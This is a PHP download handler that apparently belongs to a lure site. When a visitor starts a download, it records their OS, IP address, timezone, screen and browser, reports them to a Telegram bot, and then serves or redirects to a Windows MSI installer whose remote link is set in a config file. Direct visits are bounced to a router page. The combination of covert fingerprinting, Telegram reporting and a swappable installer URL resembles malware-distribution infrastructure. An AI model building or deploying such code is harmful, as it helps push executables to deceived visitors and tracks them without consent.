<?php
require_once __DIR__ . '/config.php';

function hasConfiguredDownloadUrl() {
    if (!filter_var(DOWNLOAD_URL, FILTER_VALIDATE_URL)) {
        return false;
    }

    $scheme = strtolower((string) parse_url(DOWNLOAD_URL, PHP_URL_SCHEME));
    return in_array($scheme, ['http', 'https'], true);
}

/**
 * Sanitize characters that have special meaning in Telegram Markdown
 */
function sanitizeMarkdown($text) {
    if (is_array($text) || is_object($text)) {
        return 'Data Error';
    }
    $search = ['*', '_', '`', '['];
    $replace = ['', '', '', ''];
    return str_replace($search, $replace, $text);
}

// Function to send Telegram notification
function sendTelegramMessage($message) {
    if (empty(TELEGRAM_BOT_TOKEN) || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        // curl_close is deprecated in PHP 8.0+ but we check for version just in case
        if (PHP_VERSION_ID < 80000) {
            curl_close($ch);
        }
        return $result !== false;
    } else {
        // Fallback to file_get_contents if curl is not available
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 10
            ],
        ];
        $context  = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        return $result !== false;
    }
}

// Lightweight availability check used by the page before it reports success.
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['check'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, max-age=0');

    $available = SERVE_LOCAL_FILE
        ? is_file(LOCAL_FILE_PATH) && is_readable(LOCAL_FILE_PATH)
        : hasConfiguredDownloadUrl();
    http_response_code($available ? 200 : 503);
    echo json_encode([
        'available' => $available,
        'filename' => DOWNLOAD_FILENAME,
    ]);
    exit;
}

// The browser navigates here at the top level so the remote MSI response is
// handled as a real download rather than as content inside a hidden iframe.
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['file'])) {
    header('Cache-Control: private, no-store, max-age=0');

    if (!SERVE_LOCAL_FILE && hasConfiguredDownloadUrl()) {
        header('Location: ' . DOWNLOAD_URL, true, 302);
    } else {
        http_response_code(503);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'The installer is temporarily unavailable.';
    }
    exit;
}

// Main logic
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Collect fingerprint data from POST
    $os = sanitizeMarkdown($_POST['os'] ?? 'Unknown');
    $browser = sanitizeMarkdown($_POST['browser'] ?? 'Unknown');
    $screen = sanitizeMarkdown($_POST['screen'] ?? 'Unknown');
    $timezone = sanitizeMarkdown($_POST['timezone'] ?? 'Unknown');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // Format message
    $message = "🚀 *New Download Attempt*\n\n";
    $message .= "💻 *OS:* {$os}\n";
    $message .= "🌍 *IP:* {$ip}\n";
    $message .= "🕒 *Timezone:* {$timezone}\n";
    $message .= "🖥️ *Screen:* {$screen}\n";
    $message .= "🌐 *Browser:* " . substr($browser, 0, 100) . "...\n";
    $message .= "\n📅 *Date:* " . date('Y-m-d H:i:s');
    
    // Send notification
    sendTelegramMessage($message);

    // The page sends notifications separately from the top-level download.
    if (isset($_POST['notify_only']) && $_POST['notify_only'] === '1') {
        http_response_code(204);
        exit;
    }
    
    // Local delivery remains supported, but URL mode redirects to the link in
    // the shared config so changing providers only requires editing one line.
    if (SERVE_LOCAL_FILE && is_file(LOCAL_FILE_PATH) && is_readable(LOCAL_FILE_PATH)) {
        $safeFilename = str_replace(['"', "\r", "\n"], '', basename(DOWNLOAD_FILENAME));

        header('Content-Type: application/x-msdownload');
        header('Content-Disposition: attachment; filename="' . $safeFilename . '"');
        header('Content-Length: ' . filesize(LOCAL_FILE_PATH));
        header('Cache-Control: private, no-store, max-age=0');
        header('X-Content-Type-Options: nosniff');

        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        set_time_limit(0);
        readfile(LOCAL_FILE_PATH);
    } elseif (!SERVE_LOCAL_FILE && hasConfiguredDownloadUrl()) {
        header('Cache-Control: private, no-store, max-age=0');
        header('Location: ' . DOWNLOAD_URL, true, 302);
    } else {
        http_response_code(503);
        header('Content-Type: text/html; charset=utf-8');
        header('Cache-Control: no-store, max-age=0');
        echo '<!doctype html><title>Download unavailable</title>';
        echo '<p>The installer is temporarily unavailable. Please try again later.</p>';
    }
    exit;
} else {
    // Direct visits return to the central router.
    header('Cache-Control: private, no-store, max-age=0');
    header('Location: ../index.php', true, 302);
    exit;
}
?>
